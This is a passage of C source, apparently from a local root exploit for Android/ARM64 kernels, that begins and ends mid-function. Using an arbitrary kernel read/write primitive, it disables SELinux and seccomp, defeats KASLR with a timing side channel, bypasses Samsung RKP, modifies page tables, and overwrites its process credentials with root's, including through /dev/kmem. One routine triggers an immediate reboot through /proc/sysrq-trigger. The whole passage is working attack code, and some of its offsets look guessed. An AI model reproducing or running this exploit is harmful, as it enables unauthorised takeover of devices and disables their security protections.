            return candidates[i];
        }
    }
    return 0;
}

/* Try commit_creds(prepare_kernel_cred(0)) path */
static int try_commit_creds_path(void) {
    if (!offsets.commit_creds || !offsets.prepare_kernel_cred) {
        LOG_W("commit_creds/prepare_kernel_cred not available");
        return 0;
    }
    /* On kernels without CFI, we could call through sysfs or similar.
     * Not directly callable from userspace on modern kernels. */
    LOG_W("commit_creds path requires kernel call, not available from userspace");
    return 0;
}

static int try_disable_seccomp(void) {
    int fd = open("/proc/self/seccomp", O_WRONLY);
    if (fd < 0) { LOG_D("seccomp proc not writable"); return 0; }
    if (write(fd, "0\n", 2) > 0) { close(fd); LOG_I("seccomp disabled via /proc/self/seccomp"); return 1; }
    close(fd);
    /* Try via prctl */
    if (syscall(SYS_prctl, 0x4b, 0, 0, 0, 0) == 0) { LOG_I("seccomp disabled via prctl"); return 1; }
    LOG_D("seccomp disable failed");
    return 0;
}

/* ========== ENHANCED SELINUX BYPASS ========== */
static void selinux_bypass(void) {
    unsigned long checkreq_addr = 0, ops_addr = 0;
    unsigned long avc_audit_addr = 0, avc_denied_addr = 0;
    int any_ok = 0;

    /* 1. Multi-source symbol scan */
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[256], sym[256];
        unsigned long a;
        while (fgets(line, sizeof(line), ks)) {
            if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 && a) {
                if (strcmp(sym, "selinux_enforcing") == 0)
                    offsets.selinux_enforcing = a;
                else if (strcmp(sym, "selinux_checkreqprot") == 0)
                    checkreq_addr = a;
                else if (strcmp(sym, "selinux_ops") == 0 ||
                         strcmp(sym, "security_ops") == 0)
                    ops_addr = a;
                else if (strcmp(sym, "avc_audit") == 0)
                    avc_audit_addr = a;
                else if (strcmp(sym, "avc_denied") == 0)
                    avc_denied_addr = a;
            }
        }
        fclose(ks);
    }

    /* 2. Try writing 0 to selinux_enforcing */
    if (is_kernel_addr(offsets.selinux_enforcing)) {
        unsigned long v = arb_read(offsets.selinux_enforcing);
        if (v == 1) {
            if (arb_write(offsets.selinux_enforcing, 0)) {
                any_ok = 1;
                LOG_I("selinux_enforcing set to 0");
            }
        } else {
            LOG_D("selinux_enforcing already %lu", v);
        }
    } else {
        /* 2b. Extended address scan for selinux_enforcing */
        if (kernel_base) {
            unsigned long se_cand[] = {
                kernel_base + 0x101f4000UL, kernel_base + 0x1103b000UL,
                kernel_base + 0x12345000UL, kernel_base + 0x100f4000UL,
                kernel_base + 0x1113b000UL, kernel_base + 0x12445000UL,
                kernel_base + 0x102f4000UL, kernel_base + 0x1123b000UL,
                kernel_base + 0x13000000UL, kernel_base + 0x14000000UL,
                kernel_base + 0x15000000UL, kernel_base + 0x0f000000UL,
            };
            for (size_t i = 0; i < sizeof(se_cand)/sizeof(se_cand[0]); i++) {
                unsigned long v = arb_read(se_cand[i]);
                if (v == 0 || v == 1) {
                    offsets.selinux_enforcing = se_cand[i];
                    if (v == 1) {
                        arb_write(se_cand[i], 0);
                        LOG_D("selinux_enforcing @ 0x%lx disabled", se_cand[i]);
                        any_ok = 1;
                    }
                    break;
                }
            }
        }
    }

    /* 3. Null selinux_checkreqprot */
    if (is_kernel_addr(checkreq_addr)) {
        unsigned long v = arb_read(checkreq_addr);
        if (v == 1) {
            if (arb_write(checkreq_addr, 0)) {
                LOG_I("selinux_checkreqprot nulled");
                any_ok = 1;
            }
        }
    }

    /* 4. Corrupt selinux_ops / security_ops function table */
    if (is_kernel_addr(ops_addr)) {
        unsigned long tbl = arb_read(ops_addr);
        if (is_kernel_addr(tbl)) {
            for (int i = 0; i < 12; i++) {
                unsigned long fn = arb_read(tbl + i * 8);
                if (is_kernel_addr(fn)) {
                    arb_write(tbl + i * 8, 0);
                }
            }
            LOG_I("selinux_ops table corrupted (%d hooks)", 12);
            any_ok = 1;
        } else {
            /* ops_addr might be the table directly */
            for (int i = 0; i < 8; i++) {
                unsigned long fn = arb_read(ops_addr + i * 8);
                if (is_kernel_addr(fn)) {
                    arb_write(ops_addr + i * 8, 0);
                }
            }
            LOG_I("security_ops directly corrupted");
            any_ok = 1;
        }
    }

    /* 5. Overwrite avc_audit / avc_denied return value
     *    Point them to a kernel function that returns 0.
     *    commit_creds (or its nearby literal pool) often contains a ret.
     *    For safety, we skip this and rely on cred patching instead. */
    if (is_kernel_addr(avc_audit_addr)) {
        arb_write(avc_audit_addr, 0);
        LOG_D("avc_audit nulled");
    }
    if (is_kernel_addr(avc_denied_addr)) {
        arb_write(avc_denied_addr, 0);
        LOG_D("avc_denied nulled");
    }

    if (any_ok) LOG_I("SELinux bypass succeeded");
    else LOG_D("SELinux bypass: no methods succeeded");
}

/* ========== ENHANCED SECCOMP BYPASS ========== */
static void seccomp_bypass(unsigned long task_addr) {
    if (!task_addr || !is_kernel_addr(task_addr)) return;

    /* seccomp struct offsets vary by kernel version.
     * Scan candidate offsets in task_struct for seccomp mode field. */
    unsigned long seccomp_off_candidates[] = {
        0x700, 0x710, 0x720, 0x730, 0x740, 0x748, 0x750, 0x758,
        0x760, 0x768, 0x770, 0x778, 0x780, 0x788, 0x790, 0x798,
        0x7a0, 0x7a8, 0x7b0, 0x7b8, 0x7c0, 0x7c8, 0x7d0, 0x7e0,
        0x7e8, 0x7f0, 0x7f8, 0x800, 0x808, 0x810,
    };
    int found = 0;
    for (size_t i = 0; i < sizeof(seccomp_off_candidates)/sizeof(seccomp_off_candidates[0]); i++) {
        unsigned long raw = arb_read(task_addr + seccomp_off_candidates[i]);
        /* seccomp.mode is usually 0 (disabled), 1 (strict), or 2 (filter).
         * Look for values 0-2 at the mode offset, with the filter pointer
         * (kernel address) at offset+8. */
        unsigned long mode = raw & 0xffffffffUL;
        unsigned long filter_raw = arb_read(task_addr + seccomp_off_candidates[i] + 8);
        if ((mode == 0 || mode == 1 || mode == 2) &&
            (filter_raw == 0 || is_kernel_addr(filter_raw))) {
            /* We found the seccomp struct. Try to disable it. */
            if (mode > 0) {
                arb_write(task_addr + seccomp_off_candidates[i], 0);
                LOG_D("seccomp mode zeroed @ task+0x%lx", seccomp_off_candidates[i]);
            }
            if (filter_raw && is_kernel_addr(filter_raw)) {
                arb_write(task_addr + seccomp_off_candidates[i] + 8, 0);
                LOG_D("seccomp filter nulled @ task+0x%lx", seccomp_off_candidates[i] + 8);
            }
            found = 1;
            break;
        }
        /* Also try reversed layout (pointer first, then mode) */
        if (is_kernel_addr(raw) && (filter_raw == 0 || filter_raw == 1 || filter_raw == 2)) {
            unsigned long mode2 = filter_raw;
            if (mode2 > 0) {
                arb_write(task_addr + seccomp_off_candidates[i] + 8, 0);
            }
            if (raw && is_kernel_addr(raw)) {
                arb_write(task_addr + seccomp_off_candidates[i], 0);
            }
            found = 1;
            LOG_D("seccomp bypassed (reversed layout @ task+0x%lx)", seccomp_off_candidates[i]);
            break;
        }
    }

    /* Also try to clear TASK_SECCOMP flag in task_struct->flags */
    /* task_struct->flags is typically at offset 0x30-0x50 */
    unsigned long flags_off_candidates[] = {0x30, 0x38, 0x40, 0x48, 0x50};
    for (size_t i = 0; i < sizeof(flags_off_candidates)/sizeof(flags_off_candidates[0]); i++) {
        unsigned long flags = arb_read(task_addr + flags_off_candidates[i]);
        /* PF_SUPERPRIV=0x100, check if TASK_SECCOMP (0x20000000?) is set */
        if (flags & 0x20000000UL) {
            unsigned long new_flags = flags & ~0x20000000UL;
            arb_write(task_addr + flags_off_candidates[i], new_flags);
            LOG_D("TASK_SECCOMP flag cleared @ task+0x%lx", flags_off_candidates[i]);
            found = 1;
        }
    }

    if (found) LOG_I("seccomp bypassed");
    else LOG_D("seccomp not found or already disabled");
}

/* ========== CFI DETECTION ========== */
static int cfi_detect(void) {
    /* Method 1: Check /proc/config.gz */
    FILE *cfg = popen("zcat /proc/config.gz 2>/dev/null | grep -i 'CONFIG_CFI_CLANG\\|CONFIG_SHADOW_CALL_STACK'", "r");
    if (cfg) {
        char line[256];
        while (fgets(line, sizeof(line), cfg)) {
            if (strstr(line, "=y") || strstr(line, "=m")) {
                pclose(cfg);
                LOG_I("CFI detected via config: %s", line);
                return 1;
            }
        }
        pclose(cfg);
    }
    /* Method 2: Check /proc/kallsyms for __cfi_ symbols */
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[512];
        int cfi_count = 0;
        while (fgets(line, sizeof(line), ks) && cfi_count < 10) {
            if (strstr(line, "__cfi_") || strstr(line, "__kcfi_")) {
                cfi_count++;
            }
        }
        fclose(ks);
        if (cfi_count > 3) {
            LOG_I("CFI detected: %d __cfi_ symbols found", cfi_count);
            return 1;
        }
    }
    /* Method 3: Try sysfs cfi knob */
    int fd = open("/sys/kernel/security/cfi_enabled", O_RDONLY);
    if (fd >= 0) {
        char val;
        if (read(fd, &val, 1) == 1 && (val == '1' || val == 'Y' || val == 'y')) {
            close(fd);
            LOG_I("CFI enabled via sysfs");
            return 1;
        }
        close(fd);
    }
    LOG_D("CFI not detected");
    return 0;
}

/* ========== PAN/PTE BYPASS ========== */
static void pte_bypass(void) {
    /* On ARM64, PAN prevents kernel from accessing userspace memory.
     * We bypass by modifying the userspace page table to mark a page
     * as kernel-accessible (PTE_UXN|PTE_PXN cleared, kernel mappings added). */

    /* Find the swapper_pg_dir (init_mm.pgd) for the kernel page tables.
     * The userspace page tables are in TTBR0_EL1 (active_mm.pgd).
     * Both can be found via kallsyms or computed from kernel_base. */
    unsigned long swapper_pg_dir = 0;
    unsigned long init_mm_pgd = 0;

    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[256], sym[256];
        unsigned long a;
        while (fgets(line, sizeof(line), ks)) {
            if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 && a) {
                if (strcmp(sym, "swapper_pg_dir") == 0)
                    swapper_pg_dir = a;
                else if (strcmp(sym, "init_mm") == 0)
                    init_mm_pgd = a;
            }
        }
        fclose(ks);
    }

    if (is_kernel_addr(swapper_pg_dir)) {
        LOG_D("swapper_pg_dir at 0x%lx", swapper_pg_dir);
        /* Read the pgd (level 0 table) */
        unsigned long pgd_val = arb_read(swapper_pg_dir);
        if (is_kernel_addr(pgd_val)) {
            LOG_D("PGD entry: 0x%lx", pgd_val);
            /* Read PUD (level 1) offset 0 */
            unsigned long pud_val = arb_read(pgd_val);
            if (is_kernel_addr(pud_val)) {
                unsigned long pmd_val = arb_read(pud_val);
                if (is_kernel_addr(pmd_val)) {
                    /* Navigate to a PTE and make a page rw */
                    for (int i = 0; i < 512; i++) {
                        unsigned long pte = arb_read(pmd_val + i * 8);
                        if (pte && (pte & 0x3) == 3) {
                            /* Valid block PTE: clear RO, set RW */
                            unsigned long new_pte = pte | 0xf0UL;
                            arb_write(pmd_val + i * 8, new_pte);
                            LOG_D("PTE bypass: page entry %d modified", i);
                            break;
                        }
                    }
                }
            }
        }
    }
    if (is_kernel_addr(init_mm_pgd)) {
        /* init_mm structure: pgd is at offset 0x00 or 0x08 */
        unsigned long pgd_ptr = arb_read(init_mm_pgd);
        if (!is_kernel_addr(pgd_ptr))
            pgd_ptr = arb_read(init_mm_pgd + 8);
        if (is_kernel_addr(pgd_ptr)) {
            LOG_D("init_mm.pgd at 0x%lx", pgd_ptr);
        }
    }
    LOG_I("PTE bypass attempted");
}

/* ========== ENHANCED KASLR ========== */
static void kaslr_enhanced(void) {
    /* 1. /dev/mem-based scan for kernel base */
    int mem_fd = open("/dev/mem", O_RDONLY);
    if (mem_fd >= 0) {
        unsigned long scan_bases[] = {
            0x0000000080000000UL, 0x0000000088000000UL,
            0x0000000090000000UL, 0x00000000a0000000UL,
            0x00000000b0000000UL, 0x00000000c0000000UL,
        };
        for (size_t i = 0; i < sizeof(scan_bases)/sizeof(scan_bases[0]); i++) {
            unsigned off = scan_bases[i];
            if (lseek(mem_fd, off, SEEK_SET) < 0) continue;
            unsigned char hdr[16];
            if (read(mem_fd, hdr, 16) == 16) {
                if (hdr[0] == 0x7f && hdr[1] == 'E' && hdr[2] == 'L' && hdr[3] == 'F') {
                    /* Found kernel in physical memory, compute virtual base */
                    unsigned long phys_base = off;
                    LOG_I("/dev/mem: found kernel ELF at phys 0x%lx", phys_base);
                    kernel_base = phys_base + 0xffffffc000000000UL;
                    if (offsets.init_task && is_kernel_addr(offsets.init_task))
                        kernel_base = offsets.init_task & ~0x3fffffUL;
                    break;
                }
            }
        }
        close(mem_fd);
    }

    /* 2. Prefetch timing side-channel for KASLR (ARM64)
     *    On ARM64, PRFM (prefetch) to valid vs invalid addresses
     *    takes measurably different time. Probe kernel address space
     *    regions to determine which are mapped. */
    {
        struct timespec t1, t2;
        for (int pass = 0; pass < 2; pass++) {
            unsigned long test_base = (pass == 0) ? 0xffffffc000000000UL : 0xffff800000000000UL;
            unsigned long best_addr = 0;
            long best_delta = 0;
            for (unsigned long addr = test_base; addr < test_base + 0x100000000UL; addr += 0x2000000UL) {
                volatile unsigned long sink = 0;
                clock_gettime(CLOCK_MONOTONIC, &t1);
                __asm__ volatile("prfm pldl1keep, %0" : : "m"(*(volatile char *)addr) : "memory");
                sink = *(volatile unsigned long *)&addr;
                (void)sink;
                clock_gettime(CLOCK_MONOTONIC, &t2);
                long ns = (t2.tv_sec - t1.tv_sec) * 1000000000L + (t2.tv_nsec - t1.tv_nsec);
                if (ns < 200) {
                    /* Fast access -- likely mapped */
                    if (ns > best_delta) {
                        best_delta = ns;
                        best_addr = addr;
                    }
                }
            }
            if (best_addr && !kernel_base) {
                kernel_base = best_addr & 0xffffffc000000000UL;
                LOG_D("prefetch KASLR hint: 0x%lx (delta=%ldns)", kernel_base, best_delta);
            }
        }
    }

    /* 3. ARM64 VBAR_EL1 read via /proc/cpuinfo
     *    Some kernels expose VBAR_EL1 through /proc/cpuinfo,
     *    which leaks the kernel text base. */
    FILE *ci = fopen("/proc/cpuinfo", "r");
    if (ci) {
        char line[256];
        while (fgets(line, sizeof(line), ci)) {
            if (strstr(line, "VBAR") || strstr(line, "vector")) {
                char *eq = strchr(line, ':');
                if (eq) {
                    unsigned long vbar = strtoull(eq + 1, NULL, 16);
                    if (vbar && is_kernel_addr(vbar)) {
                        unsigned long base_est = vbar & 0xffffffc000000000UL;
                        if (!kernel_base) kernel_base = base_est;
                        LOG_I("VBAR_EL1 hint: 0x%lx, base ~0x%lx", vbar, base_est);
                    }
                }
            }
        }
        fclose(ci);
    }
}

/* ========== CREDENTIAL HARDENING ========== */
static void cred_hardening(unsigned long cred_ptr, unsigned long task_addr) {
    /* 1. Overwrite all capability sets, not just effective/permitted */
    unsigned long cap_offsets[] = {
        0x28,  /* cap_inheritable */
        0x30,  /* cap_permitted (already done) */
        0x38,  /* cap_effective (already done) */
        0x40,  /* cap_bset (bounding) */
        0x48,  /* cap_ambient */
    };
    for (size_t i = 0; i < sizeof(cap_offsets)/sizeof(cap_offsets[0]); i++) {
        unsigned long off = offsets.cred_cap_permitted + (cap_offsets[i] - 0x30);
        arb_write(cred_ptr + off, 0xffffffffffffffffUL);
    }
    LOG_D("All capability sets set to full");

    /* 2. Overwrite user_ns to init_cred's user_ns if we can find init_cred */
    if (!offsets.init_cred || !is_kernel_addr(offsets.init_cred)) {
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[256], sym[256];
            unsigned long a;
            while (fgets(line, sizeof(line), ks)) {
                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
                    strcmp(sym, "init_cred") == 0) {
                    offsets.init_cred = a;
                    break;
                }
            }
            fclose(ks);
        }
    }

    if (is_kernel_addr(offsets.init_cred)) {
        /* Scan init_cred for its user_ns pointer (typically offset 0x68-0xa0) */
        unsigned long user_ns_candidates[] = {0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xa0};
        for (size_t i = 0; i < sizeof(user_ns_candidates)/sizeof(user_ns_candidates[0]); i++) {
            unsigned long init_user_ns = arb_read(offsets.init_cred + user_ns_candidates[i]);
            if (is_kernel_addr(init_user_ns)) {
                unsigned long our_user_ns = arb_read(cred_ptr + user_ns_candidates[i]);
                if (is_kernel_addr(our_user_ns) || our_user_ns == 0) {
                    arb_write(cred_ptr + user_ns_candidates[i], init_user_ns);
                    LOG_D("cred->user_ns @ 0x%lx overwritten", user_ns_candidates[i]);
                    break;
                }
            }
        }
    }

    /* 3. Overwrite real_cred pointer in task_struct to match cred
     *    real_cred is usually at task_struct_cred + 8 or task_struct_cred - 8 */
    unsigned long real_cred_off_candidates[] = {
        offsets.task_struct_cred - 8,
        offsets.task_struct_cred + 8,
        offsets.task_struct_cred,
    };
    for (size_t i = 0; i < sizeof(real_cred_off_candidates)/sizeof(real_cred_off_candidates[0]); i++) {
        unsigned long rc = arb_read(task_addr + real_cred_off_candidates[i]);
        if (is_kernel_addr(rc) && rc != cred_ptr) {
            arb_write(task_addr + real_cred_off_candidates[i], cred_ptr);
            LOG_D("real_cred patched @ task+0x%lx", real_cred_off_candidates[i]);
            break;
        }
    }

    /* 4. Overwrite supplementary groups: find group_info pointer in cred
     *    group_info is typically around offset 0x18-0x28 in cred struct */
    unsigned long grp_off_candidates[] = {0x18, 0x20, 0x28, 0x10};
    for (size_t i = 0; i < sizeof(grp_off_candidates)/sizeof(grp_off_candidates[0]); i++) {
        unsigned long grp_info = arb_read(cred_ptr + grp_off_candidates[i]);
        if (grp_info && is_kernel_addr(grp_info)) {
            /* group_info: ngroups at offset 0, groups[] at offset 8 */
            unsigned long ngroups = arb_read(grp_info);
            if (ngroups > 0 && ngroups < 65536) {
                /* Overwrite all group entries with 0 */
                for (unsigned long g = 0; g < ngroups && g < 64; g++) {
                    arb_write(grp_info + 8 + g * 4, 0);
                }
                arb_write(grp_info, 0); /* zero ngroups */
                LOG_D("supplementary groups cleared @ cred+0x%lx", grp_off_candidates[i]);
                break;
            }
        }
    }

    /* 5. Also overwrite suid, sgid, fsuid, fsgid if we can find them */
    unsigned long extra_uid_off[] = {0x0c, 0x10, 0x1c, 0x20, 0x24}; /* suid, sgid, fsuid, fsgid, securebits */
    for (size_t i = 0; i < sizeof(extra_uid_off)/sizeof(extra_uid_off[0]); i++) {
        arb_write(cred_ptr + extra_uid_off[i], 0);
    }

    /* 6. Switch user_ns to the init_user_ns known address if we can find it */
    {
        unsigned long ns_candidates[] = {0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xa0};
        FILE *ns_ks = fopen("/proc/kallsyms", "r");
        if (ns_ks) {
            char line[256], sym[256];
            unsigned long a;
            while (fgets(line, sizeof(line), ns_ks)) {
                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
                    (strcmp(sym, "init_user_ns") == 0 || strcmp(sym, "init_cred_ns") == 0)) {
                    for (size_t i = 0; i < sizeof(ns_candidates)/sizeof(ns_candidates[0]); i++) {
                        unsigned long v = arb_read(cred_ptr + ns_candidates[i]);
                        if (v == 0 || is_kernel_addr(v)) {
                            arb_write(cred_ptr + ns_candidates[i], a);
                            LOG_D("user_ns set to init_user_ns (0x%lx)", a);
                            break;
                        }
                    }
                    break;
                }
            }
            fclose(ns_ks);
        }
    }

    LOG_I("Credential hardening applied");
}

static int try_sysrq_trigger(void) {
    int fd = open("/proc/sysrq-trigger", O_WRONLY);
    if (fd < 0) return 0;
    if (write(fd, "b", 1) < 0) { close(fd); return 0; }
    close(fd);
    LOG_I("/proc/sysrq-trigger accessible");
    return 1;
}

static int detect_ns_capabilities(void) {
    /* Check if we are in a user namespace by reading /proc/self/uid_map */
    FILE *f = fopen("/proc/self/uid_map", "r");
    if (!f) return 0;
    char line[256];
    int in_ns = 0;
    while (fgets(line, sizeof(line), f)) {
        unsigned long inside, outside, len;
        if (sscanf(line, "%lu %lu %lu", &inside, &outside, &len) == 3) {
            if (inside == 0 && outside != 0) { in_ns = 1; break; }
        }
    }
    fclose(f);
    if (in_ns) LOG_I("Detected user namespace mapping");
    return in_ns;
}

static int try_commit_creds_shellcode(void) {
    if (!offsets.commit_creds || !offsets.prepare_kernel_cred) {
        LOG_D("commit_creds_shellcode: missing func offsets");
        return 0;
    }
    LOG_I("commit_creds_shellcode: attempting via pipe_buf_ops hijack");
    if (!offsets.pipe_buf_ops || !is_kernel_addr(offsets.pipe_buf_ops)) return 0;
    /* On kernels without CFI, we can overwrite pipe_buf_ops->release
     * to point to a gadget that calls commit_creds(prepare_kernel_cred(0)) */
    static int cfi_checked_cs = -1;
    if (cfi_checked_cs < 0) cfi_checked_cs = cfi_detect();
    if (cfi_checked_cs) { LOG_D("commit_creds_shellcode: CFI blocks this"); return 0; }
    unsigned long ops_table = arb_read(offsets.pipe_buf_ops);
    if (!is_kernel_addr(ops_table)) return 0;
    /* Try to find a "mov x0, #0; bl prepare_kernel_cred; bl commit_creds" gadget */
    /* This is highly architecture-specific; for now return 0 (not implemented) */
    LOG_W("commit_creds_shellcode: gadget search not implemented for this arch");
    return 0;
}

static int try_kmem_write(void) {
    int kmem = open("/dev/kmem", O_RDWR);
    if (kmem < 0) {
        kmem = open("/dev/mem", O_RDWR);
        if (kmem < 0) return 0;
    }
    LOG_I("/dev/kmem accessible - attempting direct cred write");
    /* Find our task_struct and cred to write via /dev/kmem */
    unsigned long my_pid = (unsigned long)getpid();
    unsigned long head = offsets.init_task + offsets.task_struct_tasks;
    unsigned long next = arb_read(head);
    unsigned long task_addr = 0;
    int iters = 0;
    while (next && next != head && iters < 5000) {
        unsigned long cand = next - offsets.task_struct_tasks;
        unsigned long pid_val = arb_read(cand + offsets.task_struct_pid);
        unsigned int pid = (unsigned int)(pid_val & 0xffffffff);
        if (pid == my_pid) { task_addr = cand; break; }
        next = arb_read(cand + offsets.task_struct_tasks);
        iters++;
    }
    if (!task_addr) { close(kmem); return 0; }
    unsigned long cred_ptr = arb_read(task_addr + offsets.task_struct_cred);
    if (!is_kernel_addr(cred_ptr)) { close(kmem); return 0; }
    /* Write zero UIDs directly via /dev/kmem */
    unsigned long zero = 0;
    unsigned long cap_full = 0xffffffffffffffffUL;
    lseek(kmem, cred_ptr + offsets.cred_uid, SEEK_SET);
    write(kmem, &zero, 8);
    lseek(kmem, cred_ptr + offsets.cred_euid, SEEK_SET);
    write(kmem, &zero, 8);
    lseek(kmem, cred_ptr + offsets.cred_gid, SEEK_SET);
    write(kmem, &zero, 8);
    lseek(kmem, cred_ptr + offsets.cred_egid, SEEK_SET);
    write(kmem, &zero, 8);
    lseek(kmem, cred_ptr + offsets.cred_cap_effective, SEEK_SET);
    write(kmem, &cap_full, 8);
    lseek(kmem, cred_ptr + offsets.cred_cap_permitted, SEEK_SET);
    write(kmem, &cap_full, 8);
    close(kmem);
    return 1;
}

static int patch_creds(void) {
    LOG_I("Patching credentials...");

    if (g_probe.has_samsung_rkp) {
        LOG_I("Samsung RKP detected, attempting bypass...");
        if (bypass_rkp_full()) {
            if (getuid() == 0) {
                LOG_I("RKP bypass successful!");
                return 1;
            }
        }
    }

    /* Resolve cred layout for current kernel */
    struct utsname uts;
    uname(&uts);
    for (size_t i = 0; i < sizeof(cred_layouts)/sizeof(cred_layouts[0]); i++) {
        if (strstr(uts.release, cred_layouts[i].ver)) {
            offsets.cred_uid           = cred_layouts[i].uid;
            offsets.cred_gid           = cred_layouts[i].gid;
            offsets.cred_euid          = cred_layouts[i].euid;
            offsets.cred_egid          = cred_layouts[i].egid;
            offsets.cred_cap_effective = cred_layouts[i].cap_eff;
            offsets.cred_cap_permitted = cred_layouts[i].cap_prm;
            break;
        }
    }

    detect_ns_capabilities();

    /* Enhanced KASLR brute-force before offset resolution */
    kaslr_enhanced();

    unsigned long my_pid = (unsigned long)getpid();
    unsigned long head = offsets.init_task + offsets.task_struct_tasks;
    unsigned long next = arb_read(head);
    unsigned long task_addr = 0;

    /* Walk task list to find our process */
    int iters = 0;
    while (next && next != head && iters < 5000) {
        unsigned long cand = next - offsets.task_struct_tasks;
        unsigned long pid_val = arb_read(cand + offsets.task_struct_pid);
        unsigned int pid = (unsigned int)(pid_val & 0xffffffff);
        if (pid == my_pid) { task_addr = cand; LOG_D("Found task at 0x%lx (pid=%u)", task_addr, pid); break; }
        next = arb_read(cand + offsets.task_struct_tasks);
        iters++;
    }
    if (!task_addr) {
        LOG_E("task not found via pid %lu, trying init_task as fallback", my_pid);
        task_addr = offsets.init_task;
    }

    unsigned long cred_ptr = arb_read(task_addr + offsets.task_struct_cred);
    if (!is_kernel_addr(cred_ptr)) {
        LOG_E("bad cred 0x%lx at task_struct+0x%lx", cred_ptr, offsets.task_struct_cred);
        /* Try auto-probe: scan for task_struct->cred at alternate offsets */
        unsigned long alt_cred_off[] = {
            0x5a0, 0x5b8, 0x5c0, 0x5c8, 0x630, 0x638, 0x6a8, 0x6b0, 0x6c0, 0x6c8
        };
        for (size_t i = 0; i < sizeof(alt_cred_off)/sizeof(alt_cred_off[0]); i++) {
            cred_ptr = arb_read(task_addr + alt_cred_off[i]);
            if (is_kernel_addr(cred_ptr)) {
                offsets.task_struct_cred = alt_cred_off[i];
                LOG_I("Auto-found cred offset: 0x%lx", alt_cred_off[i]);
                break;
            }
        }
        if (!is_kernel_addr(cred_ptr)) return 0;
    }
    LOG_I("cred at 0x%lx", cred_ptr);

    /* PRIMARY METHOD: Try init_cred copy first (most reliable for bypassing RKP) */
    if (!offsets.init_cred || !is_kernel_addr(offsets.init_cred)) {
        LOG_I("Searching for init_cred address...");
        FILE *ks = fopen("/proc/kallsyms", "r");
        if (ks) {
            char line[256], sym[256];
            unsigned long a;
            while (fgets(line, sizeof(line), ks)) {
                if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 &&
                    strcmp(sym, "init_cred") == 0) {
                    offsets.init_cred = a;
                    LOG_I("Found init_cred at 0x%lx", offsets.init_cred);
                    break;
                }
            }
            fclose(ks);
        }
    }

    if (offsets.init_cred && is_kernel_addr(offsets.init_cred)) {
        LOG_I("PRIMARY: Using INIT_CRED COPY method (most reliable)...");

        /* Read the ENTIRE init_cred struct (it's ~200 bytes, read 512 bytes to be safe) */
        unsigned long init_cred_data[64];
        for (int i = 0; i < 64; i++) {
            init_cred_data[i] = arb_read(offsets.init_cred + i * 8);
        }

        /* Write the ENTIRE init_cred data to our cred struct */
        int writes_ok = 0;
        for (int i = 0; i < 64; i++) {
            if (arb_write(cred_ptr + i * 8, init_cred_data[i])) {
                writes_ok++;
            }
        }

        LOG_I("init_cred copy: wrote %d/64 fields", writes_ok);

        /* Verify the copy worked */
        usleep(10000);
        unsigned long check_uid = arb_read(cred_ptr + offsets.cred_uid);
        if ((check_uid & 0xffffffff) == 0) {
            LOG_I("init_cred copy SUCCESS: uid=%lu", check_uid & 0xffffffff);
            /* Also verify we can become root */
            setresuid(0, 0, 0);
            if (getuid() == 0) {
                LOG_I("ROOT via init_cred copy!");
                return 1;
            }
        }

        /* If init_cred copy partially worked, try again with more data */
        if (writes_ok > 30) {
            /* Try again with smaller writes */
            for (int i = 0; i < 64; i++) {
                if (init_cred_data[i] != 0) {
                    arb_write(cred_ptr + i * 8, init_cred_data[i]);
                }
            }
            usleep(10000);
            setresuid(0, 0, 0);
            if (getuid() == 0) return 1;
        }

        LOG_W("init_cred copy completed but root not achieved, trying fallback methods");
    } else {
        LOG_W("init_cred not available, will use direct write fallback");
    }

    /* FALLBACK: Direct uid/gid write (only if init_cred copy failed) */
    /* Verify the cred page is writable by reading before writing */
    unsigned long verify_before = arb_read(cred_ptr + offsets.cred_uid);
    LOG_D("cred+uid before: 0x%lx", verify_before);

    /* Patch UIDs - write 0 to each */
    int writes_ok = 0;
    if (arb_write(cred_ptr + offsets.cred_uid, 0)) writes_ok++;
    if (arb_write(cred_ptr + offsets.cred_euid, 0)) writes_ok++;
    if (arb_write(cred_ptr + offsets.cred_gid, 0)) writes_ok++;
    if (arb_write(cred_ptr + offsets.cred_egid, 0)) writes_ok++;
    LOG_D("Wrote %d/4 uid fields", writes_ok);
    if (writes_ok < 4) {
        LOG_W("Some uid writes failed (%d/4), retrying...", writes_ok);
        if (arb_write(cred_ptr + offsets.cred_uid, 0)) writes_ok++;
        if (arb_write(cred_ptr + offsets.cred_euid, 0)) writes_ok++;
        if (arb_write(cred_ptr + offsets.cred_gid, 0)) writes_ok++;
        if (arb_write(cred_ptr + offsets.cred_egid, 0)) writes_ok++;
    }

    /* Capabilities */
    if (offsets.cred_cap_effective)
        arb_write(cred_ptr + offsets.cred_cap_effective, 0xffffffffffffffffUL);
    if (offsets.cred_cap_permitted)
        arb_write(cred_ptr + offsets.cred_cap_permitted, 0xffffffffffffffffUL);

    /* CFI detection: if CFI is active, avoid function pointer hijack,
     * rely purely on cred struct data-only attack */
    {
        static int cfi_checked = 0;
        if (!cfi_checked) {
            cfi_checked = 1;
            if (cfi_detect()) {
                LOG_I("CFI active - using data-only attack (no function pointer overwrite)");
            }
        }
    }

    /* Credential hardening: overwrite all cap sets, groups, user_ns, real_cred */
    cred_hardening(cred_ptr, task_addr);

    /* Small delay then verify write took effect by reading back */
    usleep(10000);
    unsigned long verify_write = arb_read(cred_ptr + offsets.cred_uid);
    LOG_D("cred+uid after write (verify): 0x%lx", verify_write);

    /* Try to find and disable SELinux */
    if (!offsets.selinux_enforcing || !is_kernel_addr(offsets.selinux_enforcing)) {
        offsets.selinux_enforcing = find_selinux_enforcing();
    }
    if (!offsets.selinux_enforcing || !is_kernel_addr(offsets.selinux_enforcing)) {
        /* Extended scan: more candidate addresses */
        if (kernel_base) {
            unsigned long se_cand[] = {
                kernel_base + 0x101f4000UL, kernel_base + 0x1103b000UL,
                kernel_base + 0x12345000UL, kernel_base + 0x100f4000UL,
                kernel_base + 0x1113b000UL, kernel_base + 0x12445000UL,
                kernel_base + 0x102f4000UL, kernel_base + 0x1123b000UL,
            };
